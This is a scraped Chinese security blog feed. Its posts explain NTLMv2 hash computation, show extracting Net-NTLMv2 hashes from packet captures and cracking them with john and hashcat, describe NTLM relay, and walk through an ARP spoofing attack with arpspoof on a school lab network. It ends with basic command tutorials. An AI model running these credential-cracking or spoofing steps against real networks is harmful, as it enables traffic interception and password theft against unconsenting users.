nonce:0xffffff0011223344\n\nServerChallenge+Blob:\n0x0123456789abcdef01010000000000000090d336b734c301ffffff00112233440000000002000c0044004f004d00410049004e0001000c005300450052005600450052000400140064006f006d00610069006e002e0063006f006d00030022007300650072007600650072002e0064006f006d00610069006e002e0063006f006d000000000000000000\n\n\n大致的 python 代码如下\nimport binascii\nimport hashlib\nimport hmac\n\npasswd=\"SecREt01\"\nunicode_hex_passwd = passwd.encode('utf-16le')\nmd4_passwd=hashlib.new(\"md4\",unicode_hex_passwd).digest()\nprint(passwd,binascii.hexlify(md4_passwd))\n\nusername = \"user\".upper()\ndomain = \"DOMAIN\"\n\nun_domain = username+domain\nhex_undomain = un_domain.encode('utf-16le')\nprint(\"un_domain\",binascii.hexlify(hex_undomain))\n\nenc_res = hmac.new(md4_passwd,hex_undomain,hashlib.md5).digest()\nprint(binascii.hexlify(enc_res))\n\nsc_blob=b\"\\x01\\x23\\x45\\x67\\x89\\xab\\xcd\\xef\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\xd3\\x36\\xb7\\x34\\xc3\\x01\\xff\\xff\\xff\\x00\\x11\\x22\\x33\\x44\\x00\\x00\\x00\\x00\\x02\\x00\\x0c\\x00\\x44\\x00\\x4f\\x00\\x4d\\x00\\x41\\x00\\x49\\x00\\x4e\\x00\\x01\\x00\\x0c\\x00\\x53\\x00\\x45\\x00\\x52\\x00\\x56\\x00\\x45\\x00\\x52\\x00\\x04\\x00\\x14\\x00\\x64\\x00\\x6f\\x00\\x6d\\x00\\x61\\x00\\x69\\x00\\x6e\\x00\\x2e\\x00\\x63\\x00\\x6f\\x00\\x6d\\x00\\x03\\x00\\x22\\x00\\x73\\x00\\x65\\x00\\x72\\x00\\x76\\x00\\x65\\x00\\x72\\x00\\x2e\\x00\\x64\\x00\\x6f\\x00\\x6d\\x00\\x61\\x00\\x69\\x00\\x6e\\x00\\x2e\\x00\\x63\\x00\\x6f\\x00\\x6d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\nenc_res = hmac.new(enc_res,sc_blob,hashlib.md5).hexdigest()\nprint(enc_res)\n\n最后得到的 Response 将会和 Blob 重新拼接.成为 NTLMv2 Response。\n0xcbabbca713eb795d04c97abc01ee498301010000000000000090d336b734c301ffffff00112233440000000002000c0044004f004d00410049004e0001000c005300450052005600450052000400140064006f006d00610069006e002e0063006f006d00030022007300650072007600650072002e0064006f006d00610069006e002e0063006f006d000000000000000000\n\n前面说到Response有六种格式，但是他们使用的加密流程都是一样，区别在于Challenge和加密算法不同，这里就不细展开说其他Response的生成方式了，感兴趣的还是去阅读推荐文章。（这里注意一下包文里的NTChallengeResponse并不等于net-ntlm hashv2）\n而NTLM v1与NTLM v2区别就是Challenge与加密算法不同，共同点就是加密的都是NTLM Hash。Net-NTLM Hash v1的格式为：\nusername::hostname:LM response:NTLM response:challenge\n\nNet-NTLM Hash v2的格式为：\nusername::domain:challenge:NTproofstring:modifiedntlmv2response\n\n手动获取NTLM加密搜索ntlmssp\n\n\n找到NTLMSSP_AUTH的请求包，找到SMB2&#x2F;Security Blob层。\n\n\n在这里我们可以看到认证的用户名、域名（我这里用的是工作组）。复制用户名和域名记录起来\nUserName:Administrator\nDomainName:NULL\n\n接着继续找到NTLM Response部分，找到NTLMv2 Response和NTProofStr字段，将其以16进制字段复制，记录起来。\n\n\nNTLMv2 Response:9a792665c56f71be45ecbe9c7d7a99b0010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000\nNTProofStr:9a792665c56f71be45ecbe9c7d7a99b0\n\n将NTLMv2 Response开头和NTProofStr相同的部分值删掉\nNTProofStr的值是 9a792665c56f71be45ecbe9c7d7a99b0 \n\n删除之后的NTLMv2 Response字段是:\n010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000\n\n接着过滤 ntlmssp.serverchallenge 的请求包\n\n\n同样也是过滤SMB2&#x2F;Security Blob层。找到NTLM Server Challenge值\n\n\nNTLMServerChallenge:dea8b91964571623\n\n然后按照以下字段组合在一起，保存到文本，然后就可以使用工具进行破解了。\nusername::domain:ServerChallenge:NTproofstring:modifiedntlmv2response\n\nAdministrator:::dea8b91964571623:9a792665c56f71be45ecbe9c7d7a99b0:010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000\n\n使用 john 进行破解\n\n\n脚本获取NTLM加密可以使用脚本，指定已经捕获了NTLM请求的pcap包进行获取。\n\n\n然后可以使用hashcat进行破解：\nhashcat -m 5600 hash.txt passwordlist.txt\n\n\n\nSSP &amp; SSPISSPI: Security Support Provider Interface 就是SSP的API接口，可以理解为该接口定义了很多安全有关的功能函数，但是没有具体的实现。然后SSP就是SSPI的实现。\nSSP： Security Support Provider，直译为安全支持提供者，又名Security Package.可以理解为SSP就是一个DLL。微软实现了以下SSP，用于提供安全功能：\n\nNTLM SSP\nKerberos\nCred SSP\nDigest SSP\nNegotiate SSP\nSchannel SSP\nNegotiate Extensions SSP\nPKU2U SSP\n\n在系统层面，SSP就是一个DLL用于实现身份验证功能，NTLM是基于Challenge&#x2F;Response机制，Kerberos是基于ticket的身份验证。所以，我们也可以实现自己的SSP，让系统实现更多的身份验证方法，比如Mimikatz就自己实现了一个利用SSP机制的记录密码。\n在抓包分析的时候，我们也能看见ntlmssp是在gssapi下面的。\n\n\n\n因为sspi是gssapi的变体，这里出现gssapi是为了兼容。注册为SSP的好处就是，SSP实现了了与安全有关的功能函数，那上层协议(比如SMB)在进行身份认证等功能的时候，就可以不用考虑协议细节，只需要调用相关的函数即可。而认证过程中的流量嵌入在上层协议里面。不像kerbreos，既可以镶嵌在上层协议里面，也可以作为独立的应用层协议。ntlm是只能镶嵌在上层协议里面，消息的传输依赖于使用ntlm的上层协议。\n\n\n\nHTTP是这样的：\n\n\n0x04 NTLM Relay 攻击在上面的认证过程中，我们知道了正常的 NTLM 认证流程是这样的：\n\n\n如果这个时候有个中间人出现的话：\n\n\n作为中间人，攻击者会将来自客户端的包转发给服务端，在将服务端的包转发给客户端，客户端生成 Response 后，再把 type3 包转发给服务端，服务端验证通过后，服务器将会授予攻击者访问的权限。\n","categories":["内网"],"tags":["内网"]},{"title":"命令合集","url":"/2022/08/09/%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/","content":"命令合集\n\nARP0x01 ARP原理及功能ARP协议的全称为 Address Resolution Protocol——-&gt;地址解析协议\n能够实现IP地址到MAC地址的映射，也可以询问目标IP地址对应的MAC地址\n\nARP协议只用于IPv4协议中\n\n1A.ARP的工作原理分两种情况——-&gt;A与B处于同一链路，A与B不处于同一链路\n工作原理A·处于同一链路中\n假设有两台主机A与B，A的ip地址为192.168.1.2；B的ip地址为192.168.1.3\n\n而主机A想要向B发送数据时，要先在ARP高速缓存中检查是否有网络设备B的IP地址。如果有，则直接在ARP高速缓存查出其对应的物理地址。\n\n\n若高速缓存中没有设备B，则A会通过ARP广播的方式向以太网发出ARP请求包\n\n\n而主机A发送的ARP请求包会被同一链路上的所有其他设备接收并进行解析。每台设备都会检查ARP请求包中的信息，如果ARP请求包中的目标 IP 地址和自己的相同，就会将自己主机的MAC地址写入响应包返回主机A\n\n\n工作原理B·不处于同一链路中\n需要使用ARP代理，通常ARP会被路由器隔离，但是采用代理ARP(ARP Proxy) 的路由器可以将ARP请求转发给临近的网段。使多个网段中的节点像是在同一网段内通信。\n\n1B.ARP缓存\n类似于web中的cookie\n\n通过ARP缓存，降低了网络流量的使用，在一定程度上防止了ARP的大量广播。\n1C.ARP结构&#x2F;ARP Packet上面说到，ARP想要知道对方MAC地址的信息之前，需要发送ARP请求包，我们接下来就详细拆解一下ARP请求包。前面 14 个字节构成标准以太网的首部，前两个字段 DST和SRC分别表示以太网的目的地址和以太网的源地址，以太网的目的地址如果是 ff:ff:ff:ff:ff:ff全部为1表示广播地址，在同一广播域中的所有以太网接口可以接收这些帧。后面紧跟着的是ARP请求的长度&#x2F;类型，ARP请求和ARP应答这个值为0x0806。\n\n硬件类型表示硬件地址的类型，硬件地址常见的有MAC物理或者以太网地址，对于以太网来说，此值为1。\n\n协议类型 指出映射的协议地址类型，对于IPv4地址，这个值是0x0800&#96;。\n\n硬件大小和协议大小分别指出硬件地址和协议地址的字节数。对于以太网中使用IPv4的ARP请求或应答，它们的值分别是6和4。\n\nOp字段指出如果是ARP请求，Op&#x3D;1，ARP应答，Op&#x3D;2，RARP请求Op&#x3D;3，RARP应答，Op&#x3D;4。\n\n紧跟在 Op 之后的是发送方硬件地址(MAC 地址)，发送方的协议地址(IPv4 地址)，目的硬件地址和目的协议地址。摘自大佬博客\n\n\n0x02 ARP全参数详解在CLI下输入arp /?\n\n\n1.arp -a&#x2F; arp -g作用：显示ARP表——–&gt;arp出来的就是网卡信息\n可以通过arp –a –Ninterface_address来显示指定网络接口的ARP信息\n\n\n2.arp -v作用：在详细模式下显示当前arp项。所有无效项和环回接口上的项都将显示。\n-v只能和arp -a一起使用\n\n\n3.arp -s作用：添加主机并且将Internet地址与物理地址相关联。\n执行成功后无提示信息。\n\n\n输入“arp -a”命令可以看到刚刚添加的信息，状态为静态。\n\n\n4.arp -d作用：删除指定的主机地址\ninet_addr可以是通配符 *，以删除所有主机\n下图所示为删除前面添加的157.55.85.212项。\n\n\nArp –d或arp –d *命令可以删除所有的ARP缓存信息。\n\nARP攻击的使用范围：局域网内\n\nARP 攻击0x01 ARP攻击过程首先我们知道，ARP攻击针对于局域网内，所以ARP攻击带来的影响，可以是突然使网吧内断网、可以是让机房内的所有机器上不了网，那画面简直“太美”。\n\n而ARP攻击最重要的是——————中间人\n\n先来回忆一下ARP协议是干什么的，具体原理见ARP协议\n在局域网（同一链路中），我们将场景定义为机房吧。\n\n\n在图中，A是我的同学，M是我自己，而T是老师的机子\n\n在交作业的时候A同学需要向教师T发送消息，文件也好，其他也罢\n\n而A同学要向老师发消息，需要先通过ARP协议确定教师T的MAC地址\n\n\n然而这时候M——————我自己，想干坏事儿了。利用ARP欺骗~~\n现在的我————主机M处于监听状态，我发现A同学要向教师T提交作业了，那我就在A同学主机对教师T主机的ARP请求包中掺杂我自己的请求包。那么对于A同学会收到什么样的回复呢？\n\nA同学收到两个ARP回应包，内容分别如下：\n我是教师T，我的IP地址是IP2，我的MAC地址是MAC2；\n我是教师，我的IP地址是IP2，我的MAC地址是MAC3；\nA同学一脸懵：咋回事？还有这操作？不管了，我选最新的！（后到优先）\n而这时候的A同学还心存疑惑，我们疯狂的发送ARP包给A同学，让他信以为真。\n\n稳健的ARP嗅探&#x2F;渗透工具，能在短时间内高并发做网络扫描（例如1秒钟成千上百的数据包），能够持续对外发送欺骗包。\n\n那对于A同学来说，他认定了教师T的IP为IP2，MAC地址为MAC3，也就是我电脑的地址，他原本要发给教师T的信息，也就自然而然的发到了我手上。\n可以使用Wireshark来抓取ARP包\n\n\nARP攻击过程描述完毕此时的我们已经成为了“A同学眼中的教师T”\n那我们利用这一点可以干什么坏事呢？——————这里就讲到了ARP攻击后果\n0x02 ARP攻击后果\n简单存在的几个后果\n\n1. 原本A同学要传给教师T的信息被我截胡了2. 如果A同学不是向教师T传信息，如果A同学是向路由器发包，在阻拦之后，可以造成对方断网0x03 ARP攻击的工具三、常见ARP渗透工具与底层原理分析\n基于ARP欺骗原理设计出来的渗透&#x2F;攻击工具非常多，而最终能实现什么功能则各有差异，简单举几个例子：\n1.无毒无害型的仅具备ARP扫描功能，用来发现内网主机；例如Metasploit里面的arping&#x2F;arpscan相关模块；\n**2.**ARP扫描+流量控制(限速或限制能上哪些网站和应用)例如Windows下的P2P终结者；\n3.ARP扫描+账号窃取（网站、邮箱、各种）；最强的莫过于Windows下的Cain，当然还有跨平台的Ettercap（需配合其他工具）；\n\n讲到攻击，那么防护也是不得不提的一件事\n0x04 ARP防御\n自带ARP防御功能：腾讯电脑管家、360安全卫士……\n\n专业的ARP防火墙：彩影ARP、金山贝壳、360ARP防火墙……\n\n\n记一次在学校机房的ARP攻击实战\n开始前，先交代一下使用到的工具\n\n\n使用kail机，进行ARP攻击的软件为arpspoof，无其他脚本\n\n1.安装：sudo apt-get install -y dsniff ssldump\nsudo apt-get install -y dsniff \n\n在命令行下运行arpspoof即可\n\n作为局域网内最简单的攻击手段之一，话不多说，进入实战。\n\n2.实战连着网线打开kali机。将虚拟机的网络连接方式设为桥接。\n1.查看虚拟机的端口号和IP地址sudo ipconfig\n\n\n\n2.批量查看ip地址\nfping -asg 10.1.62.1/24\n\n\n针对不同的ip地址进行扫描\n\n3.攻击sudo arpspoof -i eth0 -t &lt;victim IP> &lt;victim Subnet>\n\n这里有一些小细节需要讲的，eth0是网卡的意思，也就是有线连接，如果是无线连接的话，这里的eth0应当替换成wth0。\n像我这里的实战来说，比如我扫出来了10.1.62.75这一台的ip地址存在，则可以直接：\nsudo arpspoof -i eth0 -t 10.1.62.75 10.1.62.254\n\n\n攻击成功\n\n3.一些debug问题1：在arp攻击的时候会遇到arpspoof: couldn’t arp for hostarpspoof: couldn't arp for host\n\n看了网上一些解答，并没有给出很详细的解决方法。\n有四点：\n1、网卡不对，一般来说默认的网卡就是eth0，也有可能是其它的，具体需要查看了才知道。\n2、IP不存在或者IP地址错误，这里主要说的是192.168.1.104，有可能你的物理电脑局域网IP不是这个。\n3、IP之间不能相互通信，这个是非常重要的。\n4、IP不在同一网段，arpspoof此命令必须要保证IP都是同一网段的。\n\n第一条就是前面说到的eth0与wth0的区别\n第二条是说对方的ip可能是非存活状态\n第三条的主要原因是dns劫持的问题\n第四条则是最重要的，我一开始也是卡在这儿。\n\n我们来详细说一说第四条，注意看到前面的ifconfig的图片\n\n\n如图所示，eth0是只有ipv6地址，和局域网根本不在同一网段下啊\n这里主要有两种方法。\n第一种设置虚拟机为桥接，(90%的kali都是这样就好了)\n第二种我们鼠标右键点击kali机的右上角，手动配置ipv4的地址和dns服务器\n再进行arp攻击，起飞！\n至于是内网，就不挂截图咯，大家玩的开心！\n4.批量攻击前面说到的fping -asg ip地址是为了探测ip用的\n探测完后，开始批量攻击\nipconfig全参数命令详解0x01 Ipconfig &#x2F;all先附上操作截图\n\n\n\n\n中间省略了一些内容，因为那是虚拟机的网络配置，就先略过啦，直接看本机的\n无线局域网适配器 WLAN:  \n连接特定的 DNS 后缀 . . . . . . . :  \n描述. . . . . . . . . . . . . : Intel(R) Wireless-AC 9560 160MHz  \n物理地址. . . . . . . . . . . . . : E4-5E-37-59-57-A4  \nDHCP 已启用 . . . . . . . . . . . : 是  \n自动配置已启用. . . . . . . . . . : 是  \n本地链接 IPv6 地址. . . . . . : fe80::d76:7554:d3fd:bb58%18(首选)  \nIPv4 地址 . . . . . . . . . . . . : 192.168.5.3(首选)  \n子网掩码  . . . . . . . . . . . . : 255.255.255.0  \n获得租约的时间  . . . . . . . . . : 2021年9月29日 9:11:30  \n租约过期的时间  . . . . . . . . . : 2021年9月30日 10:33:27  \n默认网关. . . . . . . . . . . . . : 192.168.5.1  \nDHCP 服务器 . . . . . . . . . . . : 192.168.5.1  \nDHCPv6 IAID . . . . . . . . . . . : 182738487  \nDHCPv6 客户端 DUID ..: 00-01-00-01-26-60-FA-A9-B0-5C-DA-3A-96-A9  \nDNS 服务器  . . . . . . . . . . . : 192.168.5.1  \nTCPIP 上的 NetBIOS  . . . . . . . : 已启用\n1.连接特定的DNS\n这一点集中体现在Linux下，有些时候Ubuntu机，或者一些虚拟机，右上角显示网络连接，但是却出现了问号。\n\n\n一般这种情况是出现了DNS劫持的问题\n所以需要连接特定的DNS\n\nsudo vim &#x2F;etc&#x2F;resolv.conf\n打开文件后修改配置\nnameserver 8.8.8.8    &#x2F;&#x2F; google的DNSnameserver 8.8.4.4\n这就是连接特定的DNS\n2.物理地址\n即MAC地址\n\n长度为48位（6个字节），通常表示为12个16进制数\nMAC地址在一定程度上与硬件一致，是基于物理的，能够标识具体的网络节点。\nip地址通过ARP协议的对应关系，映射为MAC地址\n3.DHCPDHCP自动获取网络配置\n\n例如在Linux机下，sudo dhcp自动获取网络配置\n\n4.子网掩码子网掩码也称为网络掩码，地址掩码和子网遮罩。\n它用于指示IP地址的哪些位标识主机所在的子网，哪些位标识为主机的位掩码。\n子网掩码是一个32位地址，它具有两个主要功能。\n\n一种是屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在远程网络上。\n\n第二个是将大型IP网络划分为若干个小型子网，能够减少IP的浪费。\n\n\n5.获得租约的时间与租约过期的时间\n是DHCP自动获取网络配置，以及重新刷新网络配置的时间\n\n6.默认网关网关用来接收数据包，并将其转发至收信息的网关处，实现信息发送\n比如有网络A和网络B，\n\n网络A的IP地址范围为“192.168.1.1~192.168.1.254”，子网掩码为255.255.255.0\n\n网络B的IP地址范围为“192.168.2.1~192.168.2.254”，子网掩码为255.255.255.0\n\n\n要实现这两个网络之间的通信，则必须通过网关。\n如果网络A中的主机发现数据包的目的主机不在本地网络中，就把数据包转发给它自己的网关，再由网关转发给网络B的网关，网络B的网关再转发给网络B的某个主机。\n\n\n7.DHCP服务器指由服务器控制一段IP地址范围，客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码。\n8.ip地址IP是32位二进制数据，通常以十进制表示，并以“.”分隔。IP地址是一种逻辑地地址，用来标识网络中一个个主机，IP有唯一性，即每台机器的IP在全世界是唯一的。\n电脑之间要实现网络通信，就必须要有一个合法的ip地址。IP地址&#x3D;网络地址+主机地址，（又称：主机号和网络号组成）ip地址的结构使我们可以在Internet上很方便的寻址。\nLinux chmod 命令0x01 问题出发\n为什么学chmod这个命令\n\n最近在使用服务器跑一些程序，但是发现有时候跑程序可以，有时候会收到报错\n\n\n在我设置的crontab定时任务中，跑的程序命令是python3 run.py\n这样子一来，没有权限，加上不知道可不可以定时输入sudo的密码，这程序死循环了，根本跑不了。\n想了想好一点的方法就是将文件的权限改一改，就想到了Linux这个命令chmod\n0x02 解决方法先说解决方法吧，有时候原理并不是那么重要\nsudo chmod 777 run.py\nsudo chmod 777 auto_check-cjj.js\n\n\n\n通过这两个命令对文件的权限进行修改\n0x03 命令详解用法1：数字表示法sudo chmod +parameter filename\n那么这个参数parameter都可以是什么呢？\nchmod+参数，参数的三位数分别代表不同的含义\n\n777有3位，最高位7是设置文件所有者访问权限，第二位是设置群组访问权限，最低位是设置其他人访问权限。\n\n其中每一位的权限用数字来表示。具体有这些权限:\nr(Read，读取，权限值为4)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目 录的权限。\nw(Write,写入，权限值为2)：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。\nx(eXecute，执行，权限值为1)：对文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限。\n\n当数字为7时，7用“rwx”表示&#123;4(r)+2(w)+1(x)=7&#125;\n如果数值为6，则用“rw-”表示&#123;4(r)+2(w)+0(x)=6&#125;，”-”表示不具备权限，这里表示不具备“执行”权限。\n假如我们设定其他用户的访问权限为 “r–”，则数值为4+0+0=4\n用法2：用户表示法\n\n\nwho\n用户类型\n说明\n\n\n\nu\nuser\n文件所有者\n\n\ng\ngroup\n文件所有者所在组\n\n\no\nothers\n所有其他用户\n\n\na\nall\n所用用户, 相当于 ugo\n\n\n例如：让file.txt给所有人可读的权限\nchmod ugo+r file.txt\nchmod a+r file.txt              //等效\n\noperator 的符号模式表:\n\n\n\nOperator\n说明\n\n\n\n+\n为指定的用户类型增加权限\n\n\n-\n去除指定用户类型的权限\n\n\n&#x3D;\n设置指定用户权限的设置，即将用户类型的所有权限重新设置\n\n\npermission 的符号模式表:\n\n\n\n模式\n名字\n说明\n\n\n\nr\n读\n设置为可读权限\n\n\nw\n写\n设置为可写权限\n\n\nx\n执行权限\n设置为可执行权限\n\n\nX\n特殊执行权限\n只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行\n\n\ns\nsetuid&#x2F;gid\n当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限\n\n\nt\n粘贴位\n设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位\n\n\ncrontab命令的使用讲解一下crontab命令的使用，先说说为什么要使用crontab吧\n\ncrontab,能够定时的进行某项任务，例如跑某个程序，脚本等等\n\n那么如何使用呢？\n1. crontab的安装sudo yum install crontab\n\n安装完crontab之后，在命令行输入crontab -h进行验证，如图所示\n\n\n可以通过一系列命令查看crontab服务状态(类似查看ssh状态一样)\nsudo service crond status     // 查看crontab服务状态\n\nsudo service crond start      // 手动启动crontab服务\n\nchkconfig -level 35 crond on  //  加入开机自动启动\n\n2. crontab的基本使用教程一般来说，使用crontab最简单的就是定时跑一个程序，而crontab是以vim为载体，获取vim文件中的信息，作为整个定时运行的数据，所以这里我们要先进行命令\ncrontab -e\n\n运行完这个命令之后，会自动进入到一个vim文件当中，具体的文件名因人而异\n然后在vim文件当中编辑需要的信息——-&gt; 具体的时间格式如下\nf1 f2 f3 f4 f5 program\n\nf1：分钟   f2：小时   f3：表示一个月份中的第几天 \nf4：月份   \tf5：表示一个星期中的第几天\n\n当f1为 * 时表示每分钟都要执行program，f2为 * 时表示每小时都要执行程序，其余类推\n当f1为a-b时表示从第a分钟到第b分钟这段时间内要执行，f2为a-b时表示从第a到第b小时都要执行，其余类推\n当f1为 *&#x2F;n 时表示每n分钟个时间间隔执行一次，f2为 *&#x2F;n 表示每n小时个时间间隔执行一次，其余类推\n当f1为a,b,c,… 时表示第a,b,c,…分钟要执行，f2为a,b,c,…时表示第a,b,c…个小时要执行，其余类推\n\n\n这里以我自己为例，我想让这个py程序在每天早上7点自动运行\n\n\n\n已经设置好的crontab可以通过该命令查看\ncrontab -l\n\n删除定时任务\ncrontab -r\n\n备份crontab文件\ncrontab -l > &amp;PATH\n\n快尝试一下使用crontab吧！\nLinux之基础cp命令Linux的基础cp命令，cp的全称为copy，为复制\n那么回想一下在Windows在我们是如何进行复制粘贴任务的？先选中一个文件，然后Ctrl+c，再到需要粘贴的文件夹里面进行Ctrl+v。\n一般来说，我们需要先创建一个新的文件夹\nmkdir new file\n\n接着执行cp命令\ncp dir1  dir2\n\n这里解释一下cp命令，dir1表示的是需要选中复制的文件(或者文件夹)\ndir2表示的是被粘贴的文件(或者文件夹)\n并且，可以在dir1之下复制想要的文件，例如，将baby.txt复制为file文件\ncp /home/baby.txt  /bin/file\n\n\n小坑，复制完成之后，文件baby.txt名为file，需要修改名字\n\n\n这里使用mv命令\n\n例如，将file文件修改为baby.txt\nmv file baby.txt\n\n\n当我们想要将一整个文件夹的内容复制到另一个时，需要加上-r参数\n\ncp -r /home /bin\n\n\n\ntraceroute命令各参数详解Traceroute详解\n理解一个命令要知其然再知其所以然\n从‘这个命令有什么用’——–&gt;‘这个命令实现的原理’\n\n0x01 traceroute的作用与原理\ntrace&amp;&amp;route，机翻一下，追踪路线，能够探测自己主机到对方主机经过了多少路由。\n用法 traceroute + ip地址\n\n这里我们以 traceroute baidu.com为例\n\n\n解释一下这里出现的几个数据\n\n前面三个数据表示icmp包从电脑发出到该路由器的“最快时间”，“平均时间”和“最慢时间”。\n那为什么会出现”*”呢？\n\n那这就要追溯一下traceroute命令的实现原理了\n\n\nStep1:从源地址发送一个UDP&#x2F;ICMP(Linux用UDP，Win用ICMP)探测包到目的地址，并设置TTL=1\nStep2:到达路由器时，将TTL减1；\nStep3:当TTL变为0时，包被丢弃，路由器向源地址发回一个ICMP超时通知（ICMP Time Exceeded Message），内含发送IP包的源地址，IP包的所有内容及路由器的IP地址；\nStep4:当源地址收到该ICMP包时，显示这一跳路由信息；\nStep5: 重复1～5，并每次设置TTL加1；\nStep6: 直至目标地址收到探测数据包，并返回端口不可达通知（ICMP Port Unreachable）；\nStep7: 当源地址收到ICMP Port Unreachable包时停止traceroute。\n而出现’*’是超时，没有返回任何时间信息，所以用星号代替\n\n0x02 traceroute命令全参数详解我们先在CLI下输入traceroute /?\n\n得到的结果\n\n\n\n1.traceroute -d作用：不将地址解析成主机名\n（虽然我没看出来有什么区别）\n\n\n2.traceroute -h作用：设置最多的跃点跟踪\n\n用法traceroute -h +hostname\n\n\n\n3.traceroute -w作用：设置对外发探测包的等待响应时间\n用法traceroute -w +time +hostname\n提高等待响应时间，能够提高探测的正确性\n\n\n\nping命令\n首先先在terminal中敲入ping /?\n\n出现的是ping命令的参数一览表\n\n\n\n一个个看\n\n1.Ping -tping -t的作用于ping作用大同小异，只不过ping -t命令需要手动Control+c停止下来\nping命令用来检测网络的连通情况和分析网络速度\n\n\n这里的TTL&#x3D;49—–&gt;  TTL：Time To Leave  也就是存活时间，当信息包在网络中被传输时，TTL的域值通过一个路由器时递减1；当TTL递减到0时，信息包被路由器抛弃。\n对于TTL值：\n\n有时可以通过TTL的值来判断操作系统\n前提在于用户不修改TTL值\n\n1、WINDOWS NT&#x2F;2000  TTL：128\n2、WINDOWS 95&#x2F;98   TTL：32\n3、UNIX        TTL：255\n4、LINUX       TTL：64\n5、WIN7      TTL：64\n\n修改TTL的值：在cmd中输入regedit，修改DefaultTTL里面的TTL默认值\n\n2.Ping -a用法：ping -a +ip地址\n作用：解析出主机名\n\n这里以ping自己主机为例\n\n\n\n3.Ping -n\n作用：用来自定义发送数据包的数量，用来衡量网络速度—–&gt;根据时间\n\n用法：ping -n +parameter +ip地址\n\n\n这里的最快时间为31ms，最慢时间为36ms。说明网络质量良好\n那么网络质量不好又是一种什么样的状况呢\n\n举例\n\nping -n 10 withd-raw.github.io\n\n得到的结果如下图\n\n\n关于数据包的时间非常慢，其次，还有丢包。说明访问该url的网络不好。\n4.Ping -l size\n用法 Ping -l +parameter +ip地址\n\nnumber范围在32~65500之内\n作用：发送size指定大小的到目标主机的数据包\n\n当一次发送的数据包大于或等于65500bytes时\n将可能导致接收方计算机宕机。\n\n因为发送数据包过大时会导致计算机宕机，参考[DOS攻击](DOS攻击 - 唤起一天明月 (withd-raw.github.io))\n5.Ping -f\n用法 ping -f +ip地址\n\n作用：一般情况下发送的数据包都会通过路由分段再发送给对方，加上此参数以后路由就不会再分段处理；在接收数据的主机没有足够资源来重组片段的情况下，这可以用来禁止分片。\n6.Ping -i\n用法 Ping +ip地址 -i +parameter\n\n作用：设置源地址（发送端）发送的Ping的包的TTL值\n如果-i的参数大于TTL值，则可以成功发包\n如果-i的参数小于TTL值，则会发包失败    （有点筛选的意思了）\n\n\n7.Ping -v作用：详细输出整个ping命令结果\n\n用法 ping v -parameter +ip地址\n\n参数范围在0~255之间\n8.Ping -r\n用法 ping -r + parameter +ip地址\n\n作用：感觉和traceroute差不多，用来追踪路由\n一般和ping -n结合起来使用\n参数设置为1时的情况\n\n\n参数设置为9时的情况\n\n\n追踪到了9个路由\n9.Ping -s类似于ping -r，但是参数只能是1-4，也就是只能追踪的路由数在1-4内\n\n用法：ping -s +parameter +ip地址\n\n10.Ping -j与Ping -k\n用法：Ping -j +ip与Ping -k +ip\n\n\n-j：统计与主机列表一起使用的松散源路由\n-k：统计与主机列表一起使用的严格源路由\n\n松散源路由与严格源路由\n松散源路由:松散源路由选项只是给出IP数据报必须经过的一些”要点”，并不给出一条完备的路径，无直接连接的路由器之间的路由尚需IP软件的寻址。\n严格源路由:严格源路由选项规定IP数据报要经过路径上的每一个路由器，相邻路由器之间不得有中间路由器，并且所经过路由器的顺序不可更改。\n11.Ping -w\n用法：Ping -w +parameter +ip地址\n\n作用：等待每次回复的超时时间，容易理解\n12.Ping -R13.Ping -s计算机网络之互联网0x01互联网的组成部分互联网的核心：路由\n互联网的边缘：端系统\n\n\nA端系统的两种模式\n客户端&#x2F;服务器方式（C&#x2F;S方式）\n\n\n客户端：接受服务的终端,是服务的请求方\n服务器：服务的提供方\n\n\n\n\n对等方式（P2P方式）\n\n​       即Peer-to-Peer——&gt;如迅雷，就是P2P的连接方式\n\n\nB互联网&#x2F;网络边缘的四种接入网1.数字用户线（DSL）\n\n通俗的说法是拨号上网\n\n客户端发出信号——&gt;分为虚拟信号与数字信号，而经过耦合器耦合之后，将一部分信号分出去，传给电话信号，将另外一部分传给ISP，作为网络信号。\n\n\n\n&lt; 2.5 Mbps上行传输速率(通常&lt; 1mbps)\n&lt; 24 Mbps下行传输速率(通常&lt; 10mbps)\n\n2.电缆接入\n\n电缆接入，使用电视的线进入网络连接\n\n同样是客户端发出信号，经过耦合之后分成TV信号与网络信号。\n\n\n3.Wifi\n4.光纤到户（FTTH）\n分为PON与TON两种模式\n","tags":["命令指南"]},{"title":"往回看，新启程","url":"/2022/09/09/%E5%BE%80%E5%9B%9E%E7%9C%8B%EF%BC%8C%E6%96%B0%E5%90%AF%E7%A8%8B/","content":"用这篇文章来记录一些碎碎念的东西吧\n\n\n\nWeblogic 系列漏洞\ngolang 重构一下 sqlmap\n扫描器的开发，向朱老师请教一下 cel-go 的项目\n\n2022.9.9 